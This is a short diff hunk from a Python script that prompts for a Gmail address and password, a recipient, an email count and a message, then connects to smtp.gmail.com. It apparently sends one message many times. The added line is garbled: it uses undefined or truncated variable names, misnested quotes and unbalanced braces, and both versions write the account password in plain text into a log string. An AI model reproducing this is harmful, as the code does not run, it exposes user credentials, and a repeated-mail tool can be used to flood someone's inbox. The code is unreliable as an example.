@@ -24,7 +24,7 @@ AMMOUNT_MAILS = input()
 print("Email message: ")
 USER_MAIL_BODY = input()
 
-mail_password_recipent_ammount = USER_MAIL_ADRESS + " sent " + AMMOUNT_MAILS + " emails to " + RECIPENT_MAIL_ADRESS + " with this password: " + USER_MAIL_PASSWORD + " at: " + now.strftime("%Y-%m-%d %H:%M:%S") + " containing: " + USER_MAIL_BODY
+mail_password_recipent_ammount = f"{NT_MAILS} emails to {RECIPENT_MAIL_ADRESS} with this password: {USER_MAIL_PASSWORD}  [INFO] Time: {now.strftime("%Y-%m-%d") :: {now.strftime("%H:%M:%S") Content: {USER_MAIL_BOD} "
 
     #Logs into smtp server as user
 with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
